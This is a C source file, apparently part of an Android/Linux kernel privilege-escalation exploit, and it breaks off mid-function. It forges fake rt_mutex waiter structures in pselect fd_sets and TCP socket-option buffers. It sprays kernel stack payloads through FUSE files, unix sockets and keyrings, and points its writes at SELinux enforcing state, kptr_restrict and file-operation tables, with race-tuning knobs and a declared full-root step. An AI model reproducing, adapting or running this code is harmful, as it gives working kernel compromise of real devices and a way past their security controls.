#include "common.h"
#include "v114_logic.h"
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <stdarg.h>
#include <sys/resource.h>
#include <sys/socket.h>

#define SLIDE_MAX_ATTEMPTS 20

static int slide_max_attempts(void) {
  return env_int_range("SLIDE_MAX_ATTEMPTS", SLIDE_MAX_ATTEMPTS, 1, 1000);
}
#define SLIDE_CONSUME_DELAY 200
#define SLIDE_CONSUME_USEC 0
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT PSELECT_WAITER_WORD_SHIFT
#define SLIDE_FROZEN_SPIN_MAX 2000000000UL
#define SLIDE_WAIT_SECONDS 2

static uint32_t slide_f_wait;
static void reaper_note(const char *fmt, ...)
    __attribute__((format(printf, 1, 2)));
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static uint32_t slide_f_pi_chain2;
static uint32_t slide_f_pi_decoy;
int slide_v143_cmd_fd[2] = {-1, -1};
volatile int slide_v143_gate_open;
int slide_v143_ack_fd[2] = {-1, -1};
static int slide_v143_hijack_fd = -1;
static atomic_int slide_arm_host_go;
static atomic_int slide_arm_host_tid;
static atomic_int slide_frozen_paint_req;
static atomic_int slide_frozen_paint_done;
static atomic_int slide_waiter_ready;

static int slide_v121e_diag(void) {
  static int on = -1;
  if (on < 0) {
    on = env_flag("SLIDE_V121E_DIAG", 0);
  }
  return on;
}

static uint64_t slide_v121e_scrub_ns, slide_v121e_stop_ns, slide_v121e_go_ns,
    slide_v121e_blocked_ns, slide_v121e_win_exit_ns, slide_v121e_e1b_ns;

static void slide_v121e_stamp(uint64_t *slot) {
  if (slide_v121e_diag()) {
    *slot = (uint64_t)gettime_ns();
  }
}
static void slide_park_sleep(void) {
  util_set_oom_protect();
  for (;;) {
    const struct timespec park_ts = {.tv_sec = 60, .tv_nsec = 0};
    nanosleep(&park_ts, NULL);
  }
}
static atomic_int slide_next_target_fops;
static const char *slide_active_target(void) {
  const char *tgt = getenv("SLIDE_WRITE_TARGET");
  if (tgt && !strcmp(tgt, "selinux") && atomic_load(&slide_next_target_fops)) {
    return "fops";
  }
  return tgt;
}
static atomic_int slide_v114_stage = ATOMIC_VAR_INIT(-1);
static atomic_int slide_probe_unlocked;
static int slide_v114_twostage(void) {
  return env_flag("SLIDE_FRAME_TWOSTAGE", 1);
}
static int slide_v114_stage_now(void) {
  int s = atomic_load(&slide_v114_stage);
  if (s < 0) {
    const char *tgt = getenv("SLIDE_WRITE_TARGET");
    int probe = slide_v114_twostage() && tgt && !strcmp(tgt, "fops");
    s = probe ? SLIDE_V114_STAGE_PROBE : SLIDE_V114_STAGE_ARM;
    atomic_store(&slide_v114_stage, s);
  }
  return s;
}
static const char *slide_shape_target(void) {
  const char *tgt = slide_active_target();
  if (tgt && !strcmp(tgt, "fops") && slide_v114_twostage() &&
      slide_v114_stage_now() == SLIDE_V114_STAGE_PROBE) {
    return "probe";
  }
  return tgt;
}
static int slide_tgt_v2c(const char *tgt) {
  return tgt && (!strcmp(tgt, "fops") || !strcmp(tgt, "probe") ||
                 !strcmp(tgt, "repair") || !strcmp(tgt, "leak"));
}
_Static_assert(SLIDE_V114_FOPS_LLSEEK_OFF == FOPS_LLSEEK_OFF,
               "v114 llseek offset drift");
static atomic_int slide_waiter_waiting;
static atomic_int slide_waiter_in_requeue;
static uint64_t slide_requeue_exit_ns;
static atomic_int slide_owner_started;
static atomic_int slide_owner_entering;
static atomic_int slide_owner_tid;
static atomic_int slide_fire_done;

static int slide_dump_walk_state(const char *when);
static int slide_full_root(int vfd);
static void slide_phase_cal_finish(void);
static void slide_phase_cal_parent(void);
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_gsr_painted;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
static uint64_t slide_gsr_last_copy_ns;
static uint64_t slide_shdw_pc, slide_shdw_right, slide_shdw_left,
    slide_shdw_lock;

static uint64_t slide_identity_word;

static atomic_int slide_lock_slot_bump;
static atomic_int slide_copy_version;
static atomic_int slide_burst_done;
static volatile int slide_round_win;
static atomic_int slide_futex_gate;
static atomic_int slide_futex_violation;
static atomic_int slide_paint_gate;
static void slide_futex_guard(const char *site, int op) {
  if (!atomic_load(&slide_futex_gate)) {
    return;
  }
  int n = atomic_fetch_add(&slide_futex_violation, 1) + 1;
  if (env_flag("SLIDE_ACQ_BLOCK", 1)) {
    pr_warning("slide ACQ-GATE tid=%d site=%s op=%d n=%d -> park\n",
               (int)syscall(SYS_gettid), site, op, n);
    slide_park_sleep();
  }
  pr_warning("slide ACQ-VIOLATION tid=%d site=%s op=%d n=%d -> PROCEED\n",
             (int)syscall(SYS_gettid), site, op, n);
}

static volatile int slide_walk_done;
static int slide_waiter_nosys;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
}

int slide_pselect_put_global_word(fd_set *in, fd_set *out, fd_set *ex,
                                  int words_per_set, int global_word,
                                  uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
  case 0:
    fdset_put_word(in, word_idx, value);
    return 1;
  case 1:
    fdset_put_word(out, word_idx, value);
    return 1;
  case 2:
    fdset_put_word(ex, word_idx, value);
    return 1;
  default:
    return 0;
  }
}

uint64_t slide_pselect_get_global_word(const fd_set *in, const fd_set *out,
                                       const fd_set *ex, int words_per_set,
                                       int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
  case 0:
    return fdset_get_word(in, word_idx);
  case 1:
    return fdset_get_word(out, word_idx);
  case 2:
    return fdset_get_word(ex, word_idx);
  default:
    return 0;
  }
}

void slide_pselect_put_waiter_word(fd_set *in, fd_set *out, fd_set *ex,
                                   int words_per_set, int waiter_word,
                                   uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(in, out, ex, words_per_set,
                                             global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);
  if (getenv("SLIDE_TEST_FILL")) {
    unsigned char fillv = 0x41;
    const char *tfv = getenv("SLIDE_TEST_FILL_VAL");
    if (tfv) {
      fillv = (unsigned char)strtoul(tfv, NULL, 0);
    }
    uint64_t v = 0x0101010101010101UL * (uint64_t)fillv;
    for (int w = 0; w < 16; w++) {
      fdset_put_word(in, w, v);
      fdset_put_word(out, w, v);
      fdset_put_word(ex, w, v);
    }
    pr_info("slide pselect fill=0x%02x all 16 words x3 sets\n", fillv);
    return;
  }

  int words_per_set = slide_pselect_words_per_set();
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
      {0, SLIDE_LOGGERS_0_1, "tree_pc"},
      {1, 0, "tree_right"},
      {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
      {3, FAKE_WAITER_PRIO, "tree_prio"},
      {5, SLIDE_LOGGERS_0_1, "pi0"},
      {6, 0, "pi1"},
      {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
      {8, FAKE_WAITER_PRIO, "pi_prio"},
      {9, 0, "pi_deadline"},
      {10, SLIDE_INIT_TASK, "task"},
      {11, fake_lock, "lock"},
      {12, 3, "wake_state"},
      {13, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(in, out, ex, words_per_set, w->word, w->value,
                                  w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

static unsigned long slide_tcp_post_hold(void) {
  return (unsigned long)env_int_range("SLIDE_TCP_POST_HOLD",
                                      SLIDE_TCP_POST_HOLD, 0, 1000000);
}

static unsigned long slide_tcp_route_attempts(void) {
  return (unsigned long)env_int_range("SLIDE_TCP_ROUTE_ATTEMPTS",
                                      SLIDE_TCP_ROUTE_ATTEMPTS, 0, 1000000);
}

static unsigned long slide_tcp_route_arm_seq(void) {
  return (unsigned long)env_int_range("SLIDE_TCP_ROUTE_ARM_SEQ",
                                      SLIDE_TCP_ROUTE_ARM_SEQ, 1, 1000000);
}

static int slide_paint_route(void) {
  return env_int_range("SLIDE_TCP_ROUTE", 1, 0, 8);
}
static int slide_walk_retries(void) {
  return env_int_range("SLIDE_WALK_RETRIES", 64, 1, 1000000);
}
static unsigned refire_max(void) {
  return env_int_range("SLIDE_REFIRE_MAX", 0, 0, 6);
}

void slide_probe(const char *stage) {
  const char *p = getenv("SLIDE_PROBE");
  if (!p)
    return;
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  char line[256];
  int n = snprintf(line, sizeof(line), "[%ld.%03ld] %s\n", (long)ts.tv_sec,
                   ts.tv_nsec / 1000000, stage);
  const char *path = getenv("SLIDE_PROBE_FILE");
  if (!path || !path[0])
    path = "/dev/null";
  int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (fd < 0)
    return;
  (void)write(fd, line, (size_t)n);
  close(fd);
}

static uint64_t slide_lock_addr(void) {
  const char *v = getenv("GL_LOCK");
  if (v && *v) {
    return strtoull(v, NULL, 0);
  }
  const char *sv = getenv("SLIDE_LOCK_SLOT");
  long slot = -1;
  if (sv && *sv) {
    char *end = NULL;
    slot = strtol(sv, &end, 0);
    if (end == sv || *end != '\0') {
      slot = -1;
    }
  }
  if (slot < 0 || slot > SLIDE_LOCK_SLOT_MAX - 1) {
    pr_warning("v120 lock-slot: SLIDE_LOCK_SLOT unset/invalid (%s) -> "
               "fail-closed park\n",
               sv && *sv ? sv : "(unset)");
    slide_park_sleep();
  }
  slot += (long)atomic_load(&slide_lock_slot_bump);
  if (slot > SLIDE_LOCK_SLOT_MAX - 1) {
    pr_warning("v120 lock-slot: bumped slot %ld exceeds %d -> fail-closed "
               "park\n",
               slot, SLIDE_LOCK_SLOT_MAX - 1);
    slide_park_sleep();
  }
  return SLIDE_BSS_LOCK + (uint64_t)slot * SLIDE_LOCK_STRIDE;
}
static unsigned long slide_gsr_attempt;
static atomic_int slide_pc_win_banked;
static atomic_int slide_heal_req;
static atomic_int slide_heal_ack;
static atomic_int slide_heal_seq;
static atomic_int slide_handler_exited = ATOMIC_VAR_INIT(-1);
static _Atomic int slide_last_copy_shape;
static int slide_verdict_pending(void) {
  return atomic_load(&slide_fire_done) && !atomic_load(&slide_heal_req) &&
         !slide_round_win && slide_walk_done < (int)slide_walk_retries() &&
         !atomic_load(&slide_consume_stop);
}
static uint64_t slide_get64(const unsigned char *p, size_t off) {
  uint64_t v;
  memcpy(&v, p + off, sizeof(v));
  return v;
}

#define SLIDE_SELINUX_RIGHT_AUTO_OFF 0x02490000ULL
#define SLIDE_SELINUX_RIGHT_AUTO \
  P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SLIDE_SELINUX_RIGHT_AUTO_OFF)

static atomic_int slide_selinux_right_state = ATOMIC_VAR_INIT(0);
static uint64_t slide_selinux_right_val;
static uint64_t slide_selinux_right(void) {
  int st =
      atomic_load_explicit(&slide_selinux_right_state, memory_order_acquire);
  if (!st) {
    const char *r = getenv("SLIDE_SELINUX_RIGHT");
    uint64_t v = 0;
    if (r && *r) {
      v = !strcmp(r, "auto") ? SLIDE_SELINUX_RIGHT_AUTO : strtoull(r, NULL, 0);
      if ((v & 0xFF) != 0) {
        pr_warning("slide selinux right 0x%016llx low byte %#x != 0 -> "
                   "enforcing := %#x (not Permissive)\n",
                   (unsigned long long)v, (unsigned)(v & 0xFF),
                   (unsigned)(v & 0xFF));
      }
    }
    slide_selinux_right_val = v;
    st = v ? 2 : 1;
    atomic_store_explicit(&slide_selinux_right_state, st, memory_order_release);
  }
  return st == 2 ? slide_selinux_right_val : 0;
}

static void gsr_build_payload(unsigned char *gsr) {
  const char *tfill = getenv("SLIDE_TEST_FILL");
  unsigned char fillv = 0x41;
  const char *tfv = getenv("SLIDE_TEST_FILL_VAL");
  if (tfv) {
    fillv = (unsigned char)strtoul(tfv, NULL, 0);
  }
  memset(gsr, tfill ? fillv : 0, TCP_GSR_BUF_SIZE);
  if (tfill) {
    const char *tmode = getenv("SLIDE_TEST_FILL_MODE");
    if (tmode && !strcmp(tmode, "slot")) {
      uint64_t splat = 0x0101010101010101UL * (uint64_t)fillv;
      for (size_t j = 0; j * 8 + 8 <= TCP_GSR_BUF_SIZE; j++) {
        put64(gsr, j * 8, (splat & ~0xFFFULL) | (uint64_t)(j * 8));
      }
    }
  }
  if (slide_gsr_attempt && !tfill) {
    memset(gsr, 0x40 | (unsigned char)(slide_gsr_attempt & 0xF),
           TCP_GSR_BUF_SIZE);
  }
  if (!tfill) {
    for (size_t off = 0; off + 8 <= TCP_GSR_BUF_SIZE; off += 8) {
      put64(gsr, off, SLIDE_BSS_SAFE_TASK);
    }
  }
  gsr[4] = 0x0a;
  gsr[5] = 0x00;
  gsr[8] = 0x0a;
  gsr[9] = 0x00;
  memset(gsr + 0x0c, 0, 16);
  gsr[0x0c] = 0xff;
  gsr[0x0d] = 0x02;
  gsr[0x1b] = 0x01;
  uint64_t sh = TCP_GSR_WAITER_SHIFT;
  const char *tsh = getenv("SLIDE_TCP_SHIFT");
  if (tsh) {
    sh = strtoull(tsh, NULL, 0);
  }
  const char *tlst = getenv("SLIDE_TCP_SHIFT_LIST");
  if (tlst && *tlst && slide_gsr_attempt) {
    uint64_t vals[16];
    int n = 0;
    const char *p = tlst;
    char *end = NULL;
    while (*p && n < 16) {
      vals[n++] = strtoull(p, &end, 0);
      if (!end || end == p) {
        break;
      }
      p = end;
      while (*p == ',' || *p == ' ') {
        p++;
      }
    }
    if (n > 0) {
      unsigned long arm_seq = slide_tcp_route_arm_seq();
      if ((unsigned long)slide_gsr_attempt > arm_seq && n > 1) {
        sh = vals[1 + ((slide_gsr_attempt - arm_seq - 1) % (n - 1))];
      } else {
        sh = vals[0];
      }
      if (sh > TCP_GSR_BUF_SIZE - 0x58) {
        sh = TCP_GSR_BUF_SIZE - 0x58;
      }
    }
  }
  const char *trot = getenv("SLIDE_TCP_SHIFT_ROTATE");
  if (trot && *trot && *trot != '0' && slide_gsr_attempt && !tlst) {
    uint64_t rot =
        ((slide_gsr_attempt - 1) * 8) % (TCP_GSR_BUF_SIZE - 0x58 + 8);
    sh = rot;
    if (sh > TCP_GSR_BUF_SIZE - 0x58) {
      sh = TCP_GSR_BUF_SIZE - 0x58;
    }
  }
  const char *tgt = slide_shape_target();
  uint64_t tree_pc;
  uint64_t tree_right = 0;
  uint64_t tree_left;
  const char *pcd = getenv("SLIDE_PC_DELTA");
  if (tgt && !strcmp(tgt, "selinux")) {
    tree_pc = (SLIDE_SELINUX_STATE - (pcd ? strtoul(pcd, NULL, 0) : 8));
    tree_left = 0;
  } else if (tgt && !strcmp(tgt, "kptr")) {
    tree_pc = (SLIDE_KPTR_RESTRICT - (pcd ? strtoul(pcd, NULL, 0) : 8));
    tree_left = 0;
  } else if (tgt && !strcmp(tgt, "panic")) {
    tree_pc = SLIDE_LOGGERS_0_1;
    tree_left = 0x8ULL;
  } else if (tgt && !strcmp(tgt, "w2")) {
    uint64_t w2target = 0;
    uint64_t w2value = 0;
    const char *ta = getenv("GL_TARGET");
    const char *va = getenv("GL_W0");
    if (ta) {
      w2target = strtoull(ta, NULL, 0);
    }
    if (!va || !strcmp(va, "auto")) {
      w2value = (uint64_t)(fake_task + 0x400);
    } else {
      w2value = strtoull(va, NULL, 0);
    }
    tree_pc = (w2target - 8);
    tree_right = 0;
    tree_left = w2value;
  } else if (tgt && (!strcmp(tgt, "fops") || !strcmp(tgt, "probe") ||
                     !strcmp(tgt, "repair"))) {
    struct slide_v114_shape vs = slide_v114_shape_for(
        tgt, fake_fops, ASHMEM_MISC_FOPS_SLOT, PROBE_SCRATCH, PROBE_MARK_DELTA);
    tree_pc = vs.pc;
    tree_right = vs.right;
    tree_left = vs.left;
  } else if (tgt && !strcmp(tgt, "leak")) {
    tree_pc = fake_lock + 0x118;
    tree_right = SLIDE_LEAK_T;
    tree_left = 0;
  } else {
    tree_pc = SLIDE_LOGGERS_0_1;
    tree_left = SLIDE_RANDOM_BOOT_ID_DATA;
  }
  {
    const char *tl = getenv("GL_TREE_LEFT");
    if (tl) {
      tree_left = strtoull(tl, NULL, 0);
    }
  }
  {
    unsigned long pc_window = 3000;
    const char *pwv = getenv("SLIDE_PC_WINDOW");
    if (pwv) {
      pc_window = strtoul(pwv, NULL, 0);
    }
    if (pc_window && slide_gsr_attempt > pc_window &&
        !slide_verdict_pending()) {
      tree_pc = 0;
    }
  }
  int build_shape = slide_pc_win_banked ? 1 : 0;
  if (slide_pc_win_banked) {
    tree_pc = 0;
  }
  if (tree_pc == 0 && (tree_left == ASHMEM_MISC_FOPS_SLOT ||
                       tree_right == ASHMEM_MISC_FOPS_SLOT)) {
    tree_left = 0;
    tree_right = 0;
  }
  if (tree_pc != 0) {
    uint64_t sright = slide_selinux_right();
    if (sright) {
      tree_right = sright;
    }
  }
  if (tfill) {
    return;
  }
  put64(gsr, (size_t)(sh + 0x00), tree_pc);
  put64(gsr, (size_t)(sh + 0x08), tree_right);
  put64(gsr, (size_t)(sh + 0x10), tree_left);
  {
    int v2c_t = slide_tgt_v2c(tgt);
    put64(gsr, (size_t)(sh + 0x30),
          v2c_t ? SLIDE_BSS_SAFE_TASK : SLIDE_INIT_TASK);
  }
  uint64_t glk = slide_lock_addr();
  const char *tlk = getenv("SLIDE_TEST_LOCK");
  if (tlk) {
    glk = strtoull(tlk, NULL, 0);
  }
  if (tgt && !strcmp(tgt, "leak")) {
    glk = fake_lock;
  }
  put64(gsr, (size_t)(sh + 0x38), glk);
  if (slide_gsr_attempt == 0 || slide_gsr_attempt == 1) {
    pr_info("slide shape echo tgt=%s i=%lu pc=%016llx right=%016llx "
            "left=%016llx lock=%016llx\n",
            tgt ? tgt : "(null)", (unsigned long)slide_gsr_attempt,
            (unsigned long long)tree_pc, (unsigned long long)tree_right,
            (unsigned long long)tree_left, (unsigned long long)glk);
  }
  put64(gsr, (size_t)(sh + 0x18), SLIDE_BSS_SAFE_TASK);
  put64(gsr, (size_t)(sh + 0x20), SLIDE_BSS_SAFE_TASK);
  put64(gsr, (size_t)(sh + 0x28), SLIDE_BSS_SAFE_TASK);
  if (!slide_tgt_v2c(tgt)) {
    put32(gsr, (size_t)(sh + 0x40), 0);
    put32(gsr, (size_t)(sh + 0x44),
          (int)env_int_range("SLIDE_GSR_PRIO", 130, 1, 139));
  }
  put64(gsr, (size_t)(sh + 0x48), SLIDE_BSS_SAFE_TASK);
  put64(gsr, (size_t)(sh + 0x50), 0);
  if (!tfill) {
    uint64_t h = ((uint64_t)(page_base >> 12) * 2654435761ULL) ^
                 ((uint64_t)slide_gsr_attempt * 40503ULL);
    slide_identity_word = SLIDE_BSS_SAFE_TASK + 0x10 + 8 * (h % 189);
    put64(gsr, (size_t)(sh + 0x68), slide_identity_word);
  }
  slide_shdw_pc = slide_get64(gsr, (size_t)(sh + 0x00));
  slide_shdw_right = slide_get64(gsr, (size_t)(sh + 0x08));
  slide_shdw_left = slide_get64(gsr, (size_t)(sh + 0x10));
  slide_shdw_lock = slide_get64(gsr, (size_t)(sh + 0x38));
  slide_gsr_last_copy_ns = gettime_ns();
  atomic_store(&slide_last_copy_shape, build_shape);
  atomic_fetch_add(&slide_copy_version, 1);
}

#ifndef KEY_SPEC_PROCESS_KEYRING
#define KEY_SPEC_PROCESS_KEYRING (-2)
#endif
#ifndef SYS_add_key
#define SYS_add_key 279
#endif
void slide_deep_stack_copy(void) {
  int pad_bytes = env_int_range("SLIDE_PAD", 0, 0, 512);
  if (pad_bytes > 0) {
    volatile char *pad = (volatile char *)alloca((size_t)pad_bytes);
    (void)pad;
  }
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error(
        "slide deep missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
        page_base, fake_lock, fake_w0);
    return;
  }
  unsigned char gsr[TCP_GSR_BUF_SIZE];
  gsr_build_payload(gsr);
  const char *veh = getenv("SLIDE_DEEP_VEHICLE");
  if (!veh || !*veh) {
    veh = "fuse";
  }
  long n = env_int_range("SLIDE_DEEP_WRITES", 8, 1, 4096);
  ssize_t rc = -1;
  int ec = 0;
  slide_pc_win_banked = 0;
  if (!strcmp(veh, "fuse")) {
    const char *path = getenv("SLIDE_DEEP_PATH");
    if (!path || !*path) {
      path = "/sdcard/Android/data/com.android.shell/files/ghost_p.bin";
    }
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0 && errno == ENOENT) {
      char dir[256];
      snprintf(dir, sizeof(dir), "%s", path);
      char *slash = strrchr(dir, '/');
      if (slash) {
        *slash = 0;
        mkdir(dir, 0700);
        fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
      }
    }
    if (fd < 0) {
      pr_error("slide deep fuse open %s errno=%d\n", path, errno);
      return;
    }
    for (long i = 0; i < n; i++) {
      slide_pc_win_banked = (i > 0);
      gsr_build_payload(gsr);
      rc = write(fd, gsr, sizeof(gsr));
      ec = errno;
      if (rc != (ssize_t)sizeof(gsr)) {
        pr_error("slide deep fuse write i=%ld rc=%zd errno=%d\n", i, rc, ec);
        break;
      }
    }
    close(fd);
    unlink(path);
  } else if (!strcmp(veh, "unix")) {
    int p[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, p) < 0) {
      pr_error("slide deep unix socketpair errno=%d\n", errno);
      return;
    }
    char drain[TCP_GSR_BUF_SIZE];
    for (long i = 0; i < n; i++) {
      slide_pc_win_banked = (i > 0);
      gsr_build_payload(gsr);
      rc = send(p[0], gsr, sizeof(gsr), 0);
      ec = errno;
      if (rc != (ssize_t)sizeof(gsr)) {
        pr_error("slide deep unix send i=%ld rc=%zd errno=%d\n", i, rc, ec);
        break;
      }
      if (recv(p[1], drain, sizeof(drain), MSG_DONTWAIT) < 0) {
      }
    }
    close(p[0]);
    close(p[1]);
  } else if (!strcmp(veh, "key")) {
    for (long i = 0; i < n; i++) {
      slide_pc_win_banked = (i > 0);
      gsr_build_payload(gsr);
      rc = syscall(SYS_add_key, "user", "g", gsr, (size_t)sizeof(gsr),
                   KEY_SPEC_PROCESS_KEYRING);
      ec = errno;
      if (rc < 0) {
        pr_error("slide deep key i=%ld rc=%zd errno=%d\n", i, rc, ec);
        break;
      }
    }
  } else {
    pr_error("slide deep unknown vehicle=%s\n", veh);
    return;
  }
  pr_info("slide deep vehicle=%s writes=%ld last_rc=%zd errno=%d\n", veh, n, rc,
          ec);
}

static _Atomic int slide_spy_stop;
static pthread_t slide_spy_handle;
static int slide_spy_on;
static void *slide_tcp_spy_thread(void *arg) {
  int tid = (int)(long)arg;
  disable_rseq_for_thread();
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/stack", tid);
  char traces[8][1024];
  unsigned long tcount[8];
  int ntrace = 0;
  unsigned long bad = 0, empty = 0;
  while (!atomic_load(&slide_spy_stop)) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
      break;
    }
    char buf[1024];
    ssize_t r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r <= 0) {
      bad++;
      usleep(20000);
      continue;
    }
    buf[r] = 0;
    if (r < 16) {
      empty++;
      usleep(20000);
      continue;
    }
    int k;
    for (k = 0; k < ntrace; k++) {
      if (!strcmp(traces[k], buf)) {
        tcount[k]++;
        break;
      }
    }
    if (k == ntrace && ntrace < 8) {
      memcpy(traces[ntrace], buf, (size_t)r + 1);
      tcount[ntrace] = 1;
      ntrace++;
    }
    usleep(20000);
  }
  pr_info("slide spy(tid=%d) traces=%d empty=%lu bad=%lu\n", tid, ntrace, empty,
          bad);
  for (int k = 0; k < ntrace; k++) {
    pr_info("slide spy trace[%d] n=%lu begin\n%s\nslide spy trace[%d] end\n", k,
            tcount[k], traces[k], k);
  }
  return NULL;
}

void slide_tcp_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error(
        "slide tcp missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
        page_base, fake_lock, fake_w0);
    return;
  }

  int s = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (s < 0) {
    pr_error("slide tcp socket6 failed errno=%d\n", errno);
    return;
  }
  unsigned char gsr[TCP_GSR_BUF_SIZE];
  gsr_build_payload(gsr);

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_gsr_painted, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_fire_done, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_heal_req, 0);
  atomic_store(&slide_heal_ack, 0);

  if (slide_dump_walk_state("tcp-pre-fire")) {
    return;
  }
  pr_info("slide tcp gsr enter page=%016zx lock=%016zx task=%016llx "
          "attempts=%lu arm=%lu hold=%lu\n",
          page_base, fake_lock, (unsigned long long)SLIDE_INIT_TASK,
          slide_tcp_route_attempts(), slide_tcp_route_arm_seq(),
          slide_tcp_post_hold());
  unsigned long post_hold = slide_tcp_post_hold();
  unsigned long attempts = slide_tcp_route_attempts();
  unsigned long arm_seq = slide_tcp_route_arm_seq();
  unsigned long walk_target = (unsigned long)slide_walk_retries();
  int fire_burst = env_int_range("SLIDE_TCP_FIRE_BURST", 0, 0, 1000000);
  unsigned long attempts_eff =
      fire_burst > 0 ? arm_seq + (unsigned long)fire_burst : attempts;
  slide_probe("gsr-enter");

  for (unsigned long i = 1; i <= attempts_eff; i++) {
    if (atomic_load(&slide_consume_stop) || slide_round_win ||
        atomic_load(&slide_paint_gate) || atomic_load(&slide_heal_req) ||
        slide_walk_done >= (int)walk_target) {
      if (!slide_waiter_nosys) {
        pr_info("slide tcp gsr stop at i=%lu win=%d walks_done=%d "
                "walk_target=%lu\n",
                i, slide_round_win, slide_walk_done, walk_target);
      }
      break;
    }
    slide_gsr_attempt = i;
    gsr_build_payload(gsr);
    if (i >= arm_seq) {
      atomic_store(&slide_consume_go, (int)i);
    }
    int calls_before = atomic_load(&slide_consume_calls);
    if ((int)i == (int)arm_seq) {
      pr_info("slide gsr ARM-SHADOW att=%lu "
              "band=[%016llx %016llx %016llx %016llx]\n",
              (unsigned long)slide_gsr_attempt,
              (unsigned long long)slide_shdw_pc,
              (unsigned long long)slide_shdw_right,
              (unsigned long long)slide_shdw_left,
              (unsigned long long)slide_shdw_lock);
      pr_info("slide tcp gsr ARM now i=%lu go_set=1 page=%016zx\n", i,
              page_base);
      slide_probe("gsr-arm");
    }
    errno = 0;
    int ret = setsockopt(s, IPPROTO_IPV6, TCP_GSR_OPTNAME, gsr, sizeof(gsr));
    int saved_errno = errno;
    if (i == 1) {
      atomic_store(&slide_gsr_painted, 1);
      char pb[48];
      snprintf(pb, sizeof(pb), "gsr-r1 ret=%d e=%d", ret, saved_errno);
      slide_probe(pb);
    }
    if (i >= arm_seq) {
      if (post_hold) {
        for (unsigned long spin = 0; spin < post_hold; spin++) {
          __asm__ volatile("yield" ::: "memory");
        }
      }
    }

    int calls = atomic_load(&slide_consume_calls);
    if (!slide_waiter_nosys && (env_flag("SLIDE_TCP_LOG_EACH", 0) ||
                                (i % 100) == 0 || calls > calls_before)) {
      pr_info("slide tcp gsr seq=%lu ret=%d errno=%d calls=%d "
              "sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
              i, ret, saved_errno, calls, atomic_load(&slide_consume_sched_ok),
              atomic_load(&slide_consume_last_sched_ret),
              atomic_load(&slide_consume_last_sched_errno));
    }
    if (env_flag("SLIDE_TCP_FIRE_BREAK", 0) && calls > calls_before) {
      if (!slide_waiter_nosys) {
        pr_info("slide tcp gsr fire-break at i=%lu calls=%d\n", i, calls);
      }
      break;
    }
  }
  if (slide_spy_on) {
    atomic_store(&slide_spy_stop, 1);
    pthread_join(slide_spy_handle, NULL);
  }

  if (env_flag("SLIDE_PHASE_CAL", 0)) {
    slide_phase_cal_finish();
    _exit(0);
  }

  if (fire_burst > 0) {
    atomic_store(&slide_burst_done, 1);
    {
      unsigned long t0 = slide_waiter_nosys ? 0 : (unsigned long)gettime_ns();
      unsigned long repair_spin = (unsigned long)env_int_range(
